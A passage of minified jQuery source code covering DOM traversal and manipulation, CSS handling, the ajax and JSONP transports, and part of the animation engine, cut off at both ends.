a==="string"?d(a,b):d.makeArray(a),e=d.merge(this.get(),c);return this.pushStack(P(c[0])||P(e[0])?e:d.unique(e))},andSelf:function(){return this.add(this.prevObject)}}),d.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return d.dir(a,"parentNode")},parentsUntil:function(a,b,c){return d.dir(a,"parentNode",c)},next:function(a){return d.nth(a,2,"nextSibling")},prev:function(a){return d.nth(a,2,"previousSibling")},nextAll:function(a){return d.dir(a,"nextSibling")},prevAll:function(a){return d.dir(a,"previousSibling")},nextUntil:function(a,b,c){return d.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return d.dir(a,"previousSibling",c)},siblings:function(a){return d.sibling(a.parentNode.firstChild,a)},children:function(a){return d.sibling(a.firstChild)},contents:function(a){return d.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:d.makeArray(a.childNodes)}},function(a,b){d.fn[a]=function(c,e){var f=d.map(this,b,c),g=M.call(arguments);I.test(a)||(e=c),e&&typeof e==="string"&&(f=d.filter(e,f)),f=this.length>1&&!O[a]?d.unique(f):f,(this.length>1||K.test(e))&&J.test(a)&&(f=f.reverse());return this.pushStack(f,a,g.join(","))}}),d.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?d.find.matchesSelector(b[0],a)?[b[0]]:[]:d.find.matches(a,b)},dir:function(a,c,e){var f=[],g=a[c];while(g&&g.nodeType!==9&&(e===b||g.nodeType!==1||!d(g).is(e)))g.nodeType===1&&f.push(g),g=g[c];return f},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var R=/ jQuery\d+="(?:\d+|null)"/g,S=/^\s+/,T=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,U=/<([\w:]+)/,V=/<tbody/i,W=/<|&#?\w+;/,X=/<(?:script|object|embed|option|style)/i,Y=/checked\s*(?:[^=]|=\s*.checked.)/i,Z={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};Z.optgroup=Z.option,Z.tbody=Z.tfoot=Z.colgroup=Z.caption=Z.thead,Z.th=Z.td,d.support.htmlSerialize||(Z._default=[1,"div<div>","</div>"]),d.fn.extend({text:function(a){if(d.isFunction(a))return this.each(function(b){var c=d(this);c.text(a.call(this,b,c.text()))});if(typeof a!=="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return d.text(this)},wrapAll:function(a){if(d.isFunction(a))return this.each(function(b){d(this).wrapAll(a.call(this,b))});if(this[0]){var b=d(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(d.isFunction(a))return this.each(function(b){d(this).wrapInner(a.call(this,b))});return this.each(function(){var b=d(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){d(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){d.nodeName(this,"body")||d(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=d(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,d(arguments[0]).toArray());return a}},remove:function(a,b){for(var c=0,e;(e=this[c])!=null;c++)if(!a||d.filter(a,[e]).length)!b&&e.nodeType===1&&(d.cleanData(e.getElementsByTagName("*")),d.cleanData([e])),e.parentNode&&e.parentNode.removeChild(e);return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&d.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return d.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(R,""):null;if(typeof a!=="string"||X.test(a)||!d.support.leadingWhitespace&&S.test(a)||Z[(U.exec(a)||["",""])[1].toLowerCase()])d.isFunction(a)?this.each(function(b){var c=d(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);else{a=a.replace(T,"<$1></$2>");try{for(var c=0,e=this.length;c<e;c++)this[c].nodeType===1&&(d.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(f){this.empty().append(a)}}return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(d.isFunction(a))return this.each(function(b){var c=d(this),e=c.html();c.replaceWith(a.call(this,b,e))});typeof a!=="string"&&(a=d(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;d(this).remove(),b?d(b).before(a):d(c).append(a)})}return this.length?this.pushStack(d(d.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,e){var f,g,h,i,j=a[0],k=[];if(!d.support.checkClone&&arguments.length===3&&typeof j==="string"&&Y.test(j))return this.each(function(){d(this).domManip(a,c,e,!0)});if(d.isFunction(j))return this.each(function(f){var g=d(this);a[0]=j.call(this,f,c?g.html():b),g.domManip(a,c,e)});if(this[0]){i=j&&j.parentNode,d.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?f={fragment:i}:f=d.buildFragment(a,this,k),h=f.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&d.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)e.call(c?$(this[l],g):this[l],f.cacheable||m>1&&l<n?d.clone(h,!0,!0):h)}k.length&&d.each(k,bc)}return this}}),d.buildFragment=function(a,b,e){var f,g,h,i=b&&b[0]?b[0].ownerDocument||b[0]:c;a.length===1&&typeof a[0]==="string"&&a[0].length<512&&i===c&&a[0].charAt(0)==="<"&&!X.test(a[0])&&(d.support.checkClone||!Y.test(a[0]))&&(g=!0,h=d.fragments[a[0]],h&&(h!==1&&(f=h))),f||(f=i.createDocumentFragment(),d.clean(a,i,f,e)),g&&(d.fragments[a[0]]=h?f:1);return{fragment:f,cacheable:g}},d.fragments={},d.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){d.fn[a]=function(c){var e=[],f=d(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&f.length===1){f[b](this[0]);return this}for(var h=0,i=f.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();d(f[h])[b](j),e=e.concat(j)}return this.pushStack(e,a,f.selector)}}),d.extend({clone:function(a,b,c){var e=a.cloneNode(!0),f,g,h;if((!d.support.noCloneEvent||!d.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!d.isXMLDoc(a)){ba(a,e),f=bb(a),g=bb(e);for(h=0;f[h];++h)ba(f[h],g[h])}if(b){_(a,e);if(c){f=bb(a),g=bb(e);for(h=0;f[h];++h)_(f[h],g[h])}}return e},clean:function(a,b,e,f){b=b||c,typeof b.createElement==="undefined"&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||c);var g=[];for(var h=0,i;(i=a[h])!=null;h++){typeof i==="number"&&(i+="");if(!i)continue;if(typeof i!=="string"||W.test(i)){if(typeof i==="string"){i=i.replace(T,"<$1></$2>");var j=(U.exec(i)||["",""])[1].toLowerCase(),k=Z[j]||Z._default,l=k[0],m=b.createElement("div");m.innerHTML=k[1]+i+k[2];while(l--)m=m.lastChild;if(!d.support.tbody){var n=V.test(i),o=j==="table"&&!n?m.firstChild&&m.firstChild.childNodes:k[1]==="<table>"&&!n?m.childNodes:[];for(var p=o.length-1;p>=0;--p)d.nodeName(o[p],"tbody")&&!o[p].childNodes.length&&o[p].parentNode.removeChild(o[p])}!d.support.leadingWhitespace&&S.test(i)&&m.insertBefore(b.createTextNode(S.exec(i)[0]),m.firstChild),i=m.childNodes}}else i=b.createTextNode(i);i.nodeType?g.push(i):g=d.merge(g,i)}if(e)for(h=0;g[h];h++)!f||!d.nodeName(g[h],"script")||g[h].type&&g[h].type.toLowerCase()!=="text/javascript"?(g[h].nodeType===1&&g.splice.apply(g,[h+1,0].concat(d.makeArray(g[h].getElementsByTagName("script")))),e.appendChild(g[h])):f.push(g[h].parentNode?g[h].parentNode.removeChild(g[h]):g[h]);return g},cleanData:function(a){var b,c,e=d.cache,f=d.expando,g=d.event.special,h=d.support.deleteExpando;for(var i=0,j;(j=a[i])!=null;i++){if(j.nodeName&&d.noData[j.nodeName.toLowerCase()])continue;c=j[d.expando];if(c){b=e[c]&&e[c][f];if(b&&b.events){for(var k in b.events)g[k]?d.event.remove(j,k):d.removeEvent(j,k,b.handle);b.handle&&(b.handle.elem=null)}h?delete j[d.expando]:j.removeAttribute&&j.removeAttribute(d.expando),delete e[c]}}}});var bd=/alpha\([^)]*\)/i,be=/opacity=([^)]*)/,bf=/-([a-z])/ig,bg=/([A-Z]|^ms)/g,bh=/^-?\d+(?:px)?$/i,bi=/^-?\d/,bj={position:"absolute",visibility:"hidden",display:"block"},bk=["Left","Right"],bl=["Top","Bottom"],bm,bn,bo,bp=function(a,b){return b.toUpperCase()};d.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return d.access(this,a,c,!0,function(a,c,e){return e!==b?d.style(a,c,e):d.css(a,c)})},d.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bm(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{zIndex:!0,fontWeight:!0,opacity:!0,zoom:!0,lineHeight:!0},cssProps:{"float":d.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,e,f){if(a&&a.nodeType!==3&&a.nodeType!==8&&a.style){var g,h=d.camelCase(c),i=a.style,j=d.cssHooks[h];c=d.cssProps[h]||h;if(e===b){if(j&&"get"in j&&(g=j.get(a,!1,f))!==b)return g;return i[c]}if(typeof e==="number"&&isNaN(e)||e==null)return;typeof e==="number"&&!d.cssNumber[h]&&(e+="px");if(!j||!("set"in j)||(e=j.set(a,e))!==b)try{i[c]=e}catch(k){}}},css:function(a,c,e){var f,g=d.camelCase(c),h=d.cssHooks[g];c=d.cssProps[g]||g;if(h&&"get"in h&&(f=h.get(a,!0,e))!==b)return f;if(bm)return bm(a,c,g)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]},camelCase:function(a){return a.replace(bf,bp)}}),d.curCSS=d.css,d.each(["height","width"],function(a,b){d.cssHooks[b]={get:function(a,c,e){var f;if(c){a.offsetWidth!==0?f=bq(a,b,e):d.swap(a,bj,function(){f=bq(a,b,e)});if(f<=0){f=bm(a,b,b),f==="0px"&&bo&&(f=bo(a,b,b));if(f!=null)return f===""||f==="auto"?"0px":f}if(f<0||f==null){f=a.style[b];return f===""||f==="auto"?"0px":f}return typeof f==="string"?f:f+"px"}},set:function(a,b){if(!bh.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),d.support.opacity||(d.cssHooks.opacity={get:function(a,b){return be.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style;c.zoom=1;var e=d.isNaN(b)?"":"alpha(opacity="+b*100+")",f=c.filter||"";c.filter=bd.test(f)?f.replace(bd,e):c.filter+" "+e}}),d(function(){d.support.reliableMarginRight||(d.cssHooks.marginRight={get:function(a,b){var c;d.swap(a,{display:"inline-block"},function(){b?c=bm(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bn=function(a,c,e){var f,g,h;e=e.replace(bg,"-$1").toLowerCase();if(!(g=a.ownerDocument.defaultView))return b;if(h=g.getComputedStyle(a,null))f=h.getPropertyValue(e),f===""&&!d.contains(a.ownerDocument.documentElement,a)&&(f=d.style(a,e));return f}),c.documentElement.currentStyle&&(bo=function(a,b){var c,d=a.currentStyle&&a.currentStyle[b],e=a.runtimeStyle&&a.runtimeStyle[b],f=a.style;!bh.test(d)&&bi.test(d)&&(c=f.left,e&&(a.runtimeStyle.left=a.currentStyle.left),f.left=b==="fontSize"?"1em":d||0,d=f.pixelLeft+"px",f.left=c,e&&(a.runtimeStyle.left=e));return d===""?"auto":d}),bm=bn||bo,d.expr&&d.expr.filters&&(d.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!d.support.reliableHiddenOffsets&&(a.style.display||d.css(a,"display"))==="none"},d.expr.filters.visible=function(a){return!d.expr.filters.hidden(a)});var br=/%20/g,bs=/\[\]$/,bt=/\r?\n/g,bu=/#.*$/,bv=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bw=/^(?:color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bx=/^(?:about|app|app\-storage|.+\-extension|file|widget):$/,by=/^(?:GET|HEAD)$/,bz=/^\/\//,bA=/\?/,bB=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bC=/^(?:select|textarea)/i,bD=/\s+/,bE=/([?&])_=[^&]*/,bF=/(^|\-)([a-z])/g,bG=function(a,b,c){return b+c.toUpperCase()},bH=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bI=d.fn.load,bJ={},bK={},bL,bM;try{bL=c.location.href}catch(bN){bL=c.createElement("a"),bL.href="",bL=bL.href}bM=bH.exec(bL.toLowerCase())||[],d.fn.extend({load:function(a,c,e){if(typeof a!=="string"&&bI)return bI.apply(this,arguments);if(!this.length)return this;var f=a.indexOf(" ");if(f>=0){var g=a.slice(f,a.length);a=a.slice(0,f)}var h="GET";c&&(d.isFunction(c)?(e=c,c=b):typeof c==="object"&&(c=d.param(c,d.ajaxSettings.traditional),h="POST"));var i=this;d.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?d("<div>").append(c.replace(bB,"")).find(g):c)),e&&i.each(e,[c,b,a])}});return this},serialize:function(){return d.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?d.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bC.test(this.nodeName)||bw.test(this.type))}).map(function(a,b){var c=d(this).val();return c==null?null:d.isArray(c)?d.map(c,function(a,c){return{name:b.name,value:a.replace(bt,"\r\n")}}):{name:b.name,value:c.replace(bt,"\r\n")}}).get()}}),d.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){d.fn[b]=function(a){return this.bind(b,a)}}),d.each(["get","post"],function(a,c){d[c]=function(a,e,f,g){d.isFunction(e)&&(g=g||f,f=e,e=b);return d.ajax({type:c,url:a,data:e,success:f,dataType:g})}}),d.extend({getScript:function(a,c){return d.get(a,b,c,"script")},getJSON:function(a,b,c){return d.get(a,b,c,"json")},ajaxSetup:function(a,b){b?d.extend(!0,a,d.ajaxSettings,b):(b=a,a=d.extend(!0,d.ajaxSettings,b));for(var c in {context:1,url:1})c in b?a[c]=b[c]:c in d.ajaxSettings&&(a[c]=d.ajaxSettings[c]);return a},ajaxSettings:{url:bL,isLocal:bx.test(bM[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":"*/*"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":d.parseJSON,"text xml":d.parseXML}},ajaxPrefilter:bO(bJ),ajaxTransport:bO(bK),ajax:function(a,c){function v(a,c,l,n){if(r!==2){r=2,p&&clearTimeout(p),o=b,m=n||"",u.readyState=a?4:0;var q,t,v,w=l?bR(e,u,l):b,x,y;if(a>=200&&a<300||a===304){if(e.ifModified){if(x=u.getResponseHeader("Last-Modified"))d.lastModified[k]=x;if(y=u.getResponseHeader("Etag"))d.etag[k]=y}if(a===304)c="notmodified",q=!0;else try{t=bS(e,w),c="success",q=!0}catch(z){c="parsererror",v=z}}else{v=c;if(!c||a)c="error",a<0&&(a=0)}u.status=a,u.statusText=c,q?h.resolveWith(f,[t,c,u]):h.rejectWith(f,[u,c,v]),u.statusCode(j),j=b,s&&g.trigger("ajax"+(q?"Success":"Error"),[u,e,q?t:v]),i.resolveWith(f,[u,c]),s&&(g.trigger("ajaxComplete",[u,e]),--d.active||d.event.trigger("ajaxStop"))}}typeof a==="object"&&(c=a,a=b),c=c||{};var e=d.ajaxSetup({},c),f=e.context||e,g=f!==e&&(f.nodeType||f instanceof d)?d(f):d.event,h=d.Deferred(),i=d._Deferred(),j=e.statusCode||{},k,l={},m,n,o,p,q,r=0,s,t,u={readyState:0,setRequestHeader:function(a,b){r||(l[a.toLowerCase().replace(bF,bG)]=b);return this},getAllResponseHeaders:function(){return r===2?m:null},getResponseHeader:function(a){var c;if(r===2){if(!n){n={};while(c=bv.exec(m))n[c[1].toLowerCase()]=c[2]}c=n[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){r||(e.mimeType=a);return this},abort:function(a){a=a||"abort",o&&o.abort(a),v(0,a);return this}};h.promise(u),u.success=u.done,u.error=u.fail,u.complete=i.done,u.statusCode=function(a){if(a){var b;if(r<2)for(b in a)j[b]=[j[b],a[b]];else b=a[u.status],u.then(b,b)}return this},e.url=((a||e.url)+"").replace(bu,"").replace(bz,bM[1]+"//"),e.dataTypes=d.trim(e.dataType||"*").toLowerCase().split(bD),e.crossDomain==null&&(q=bH.exec(e.url.toLowerCase()),e.crossDomain=q&&(q[1]!=bM[1]||q[2]!=bM[2]||(q[3]||(q[1]==="http:"?80:443))!=(bM[3]||(bM[1]==="http:"?80:443)))),e.data&&e.processData&&typeof e.data!=="string"&&(e.data=d.param(e.data,e.traditional)),bP(bJ,e,c,u);if(r===2)return!1;s=e.global,e.type=e.type.toUpperCase(),e.hasContent=!by.test(e.type),s&&d.active++===0&&d.event.trigger("ajaxStart");if(!e.hasContent){e.data&&(e.url+=(bA.test(e.url)?"&":"?")+e.data),k=e.url;if(e.cache===!1){var w=d.now(),x=e.url.replace(bE,"$1_="+w);e.url=x+(x===e.url?(bA.test(e.url)?"&":"?")+"_="+w:"")}}if(e.data&&e.hasContent&&e.contentType!==!1||c.contentType)l["Content-Type"]=e.contentType;e.ifModified&&(k=k||e.url,d.lastModified[k]&&(l["If-Modified-Since"]=d.lastModified[k]),d.etag[k]&&(l["If-None-Match"]=d.etag[k])),l.Accept=e.dataTypes[0]&&e.accepts[e.dataTypes[0]]?e.accepts[e.dataTypes[0]]+(e.dataTypes[0]!=="*"?", */*; q=0.01":""):e.accepts["*"];for(t in e.headers)u.setRequestHeader(t,e.headers[t]);if(e.beforeSend&&(e.beforeSend.call(f,u,e)===!1||r===2)){u.abort();return!1}for(t in {success:1,error:1,complete:1})u[t](e[t]);o=bP(bK,e,c,u);if(o){u.readyState=1,s&&g.trigger("ajaxSend",[u,e]),e.async&&e.timeout>0&&(p=setTimeout(function(){u.abort("timeout")},e.timeout));try{r=1,o.send(l,v)}catch(y){status<2?v(-1,y):d.error(y)}}else v(-1,"No Transport");return u},param:function(a,c){var e=[],f=function(a,b){b=d.isFunction(b)?b():b,e[e.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=d.ajaxSettings.traditional);if(d.isArray(a)||a.jquery&&!d.isPlainObject(a))d.each(a,function(){f(this.name,this.value)});else for(var g in a)bQ(g,a[g],c,f);return e.join("&").replace(br,"+")}}),d.extend({active:0,lastModified:{},etag:{}});var bT=d.now(),bU=/(\=)\?(&|$)|\?\?/i;d.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return d.expando+"_"+bT++}}),d.ajaxPrefilter("json jsonp",function(b,c,e){var f=typeof b.data==="string";if(b.dataTypes[0]==="jsonp"||c.jsonpCallback||c.jsonp!=null||b.jsonp!==!1&&(bU.test(b.url)||f&&bU.test(b.data))){var g,h=b.jsonpCallback=d.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2",m=function(){a[h]=i,g&&d.isFunction(i)&&a[h](g[0])};b.jsonp!==!1&&(j=j.replace(bU,l),b.url===j&&(f&&(k=k.replace(bU,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},e.then(m,m),b.converters["script json"]=function(){g||d.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),d.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){d.globalEval(a);return a}}}),d.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),d.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var bV=d.now(),bW,bX;d.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&bZ()||b$()}:bZ,bX=d.ajaxSettings.xhr(),d.support.ajax=!!bX,d.support.cors=bX&&"withCredentials"in bX,bX=b,d.support.ajax&&d.ajaxTransport(function(a){if(!a.crossDomain||d.support.cors){var c;return{send:function(e,f){var g=a.xhr(),h,i;a.username?g.open(a.type,a.url,a.async,a.username,a.password):g.open(a.type,a.url,a.async);if(a.xhrFields)for(i in a.xhrFields)g[i]=a.xhrFields[i];a.mimeType&&g.overrideMimeType&&g.overrideMimeType(a.mimeType),!a.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(i in e)g.setRequestHeader(i,e[i])}catch(j){}g.send(a.hasContent&&a.data||null),c=function(e,i){var j,k,l,m,n;try{if(c&&(i||g.readyState===4)){c=b,h&&(g.onreadystatechange=d.noop,delete bW[h]);if(i)g.readyState!==4&&g.abort();else{j=g.status,l=g.getAllResponseHeaders(),m={},n=g.responseXML,n&&n.documentElement&&(m.xml=n),m.text=g.responseText;try{k=g.statusText}catch(o){k=""}j||!a.isLocal||a.crossDomain?j===1223&&(j=204):j=m.text?200:404}}}catch(p){i||f(-1,p)}m&&f(j,k,m,l)},a.async&&g.readyState!==4?(bW||(bW={},bY()),h=bV++,g.onreadystatechange=bW[h]=c):c()},abort:function(){c&&c(0,1)}}}});var b_={},ca=/^(?:toggle|show|hide)$/,cb=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,cc,cd=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]];d.fn.extend({show:function(a,b,c){var e,f;if(a||a===0)return this.animate(ce("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)e=this[g],f=e.style.display,!d._data(e,"olddisplay")&&f==="none"&&(f=e.style.display=""),f===""&&d.css(e,"display")==="none"&&d._data(e,"olddisplay",cf(e.nodeName));for(g=0;g<h;g++){e=this[g],f=e.style.display;if(f===""||f==="none")e.style.display=d._data(e,"olddisplay")||""}return this},hide:function(a,b,c){if(a||a===0)return this.animate(ce("hide",3),a,b,c);for(var e=0,f=this.length;e<f;e++){var g=d.css(this[e],"display");g!=="none"&&!d._data(this[e],"olddisplay")&&d._data(this[e],"olddisplay",g)}for(e=0;e<f;e++)this[e].style.display="none";return this},_toggle:d.fn.toggle,toggle:function(a,b,c){var e=typeof a==="boolean";d.isFunction(a)&&d.isFunction(b)?this._toggle.apply(this,arguments):a==null||e?this.each(function(){var b=e?a:d(this).is(":hidden");d(this)[b?"show":"hide"]()}):this.animate(ce("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,e){var f=d.speed(b,c,e);if(d.isEmptyObject(a))return this.each(f.complete);return this[f.queue===!1?"each":"queue"](function(){var b=d.extend({},f),c,e=this.nodeType===1,g=e&&d(this).is(":hidden"),h=this;for(c in a){var i=d.camelCase(c);c!==i&&(a[i]=a[c],delete a[c],c=i);if(a[c]==="hide"&&g||a[c]==="show"&&!g)return b.complete.call(this);if(e&&(c==="height"||c==="width")){b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY];if(d.css(this,"display")==="inline"&&d.css(this,"float")==="none")if(d.support.inlineBlockNeedsLayout){var j=cf(this.nodeName);j==="inline"?this.style.display="inline-block":(this.style.display="inline",this.style.zoom=1)}else this.style.display="inline-block"}d.isArray(a[c])&&((b.specialEasing=b.specialEasing||{})[c]=a[c][1],a[c]=a[c][0])}b.overflow!=null&&(this.style.overflow="hidden"),b.curAnim=d.extend({},a),d.each(a,function(c,e){var f=new d.fx(h,b,c);if(ca.test(e))f[e==="toggle"?g?"show":"hide":e](a);else{var i=cb.exec(e),j=f.cur();if(i){var k=parseFloat(i[2]),l=i[3]||(d.cssNumber[c]?"":"px");l!=="px"&&(d.style(h,c,(k||1)+l),j=(k||1)/f.cur()*j,d.style(h,c,j+l)),i[1]&&(k=(i[1]==="-="?-1:1)*k+j),f.custom(j,k,l)}else f.custom(j,e,"")}});return!0})},stop:function(a,b){var c=d.timers;a&&this.queue([]),this.each(function(){for(var a=c.length-1;a>=0;a--)c[a].elem===this&&(b&&c[a](!0),c.splice(a,1))}),b||this.dequeue();return this}}),d.each({slideDown:ce("show",1),slideUp:ce("hide",1),slideToggle:ce("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){d.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),d.extend({speed:function(a,b,c){var e=a&&typeof a==="object"?d.extend({},a):{complete:c||!c&&b||d.isFunction(a)&&a,duration:a,easing:c&&b||b&&!d.isFunction(b)&&b};e.duration=d.fx.off?0:typeof e.duration==="number"?e.duration:e.duration in d.fx.speeds?d.fx.speeds[e.duration]:d.fx.speeds._default,e.old=e.complete,e.complete=function(){e.queue!==!1&&d(this).dequeue(),d.isFunction(e.old)&&e.old.call(this)};return e},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig||(b.orig={})}}),d.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(d.fx.step[this.prop]||d.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=d.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,b,c){function g(a){return e.step(a)}var e=this,f=d.fx;this.startTime=d.now(),this.start=a,this.end=b,this.unit=c||this.unit||(d.cssNumber[this.prop]?"":"px"),this.now=this.start,this.pos=this.state=0,g.elem=this.elem,g()&&d.timers.push(g)&&!cc&&(cc=setInterval(f.tick,f.interval))},show:function(){this.options.orig[this.prop]=d.style(this.elem,this.prop),this.options.show=!0,this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),d(this.elem).show()},hide:function(){this.options.orig[this.prop]=d.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var b=d.now(),c=!0;if(a||b>=this.options.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),this.options.curAnim[this.prop]=!0;for(var e in this.options.curAnim)this.options.curAnim[e]!==!0&&(c=!1);if(c){if(this.options.overflow!=null&&!d.support.shrinkWrapBlocks){var f=this.elem,g=this.options;d.each(["","X","Y"],function(a,b){f.style["overflow"+b]=g.overflow[a]})}this.options.hide&&d(this.elem).hide();if(this.options.hide||this.options.show)for(var h in this.options.curAnim)d.style(this.elem,h,this.options.orig[h]);this.options.complete.call(this.elem)}return!1}var i=b-this.startTime;this.state=i/this.options.duration;var j=this.options.specialEasing&&this.options.specialEasing[this.prop],k=this.options.easing||(d.easing.swing?"swing":"linear");this.pos=d.easing[j||k](this.state,i,0,1,this.options.duration),this.now=this.start+(this.end-this.start)*this.pos,this.update();return!0}},d.extend(d.fx,{tick:function(){var a=d.timers;for(var 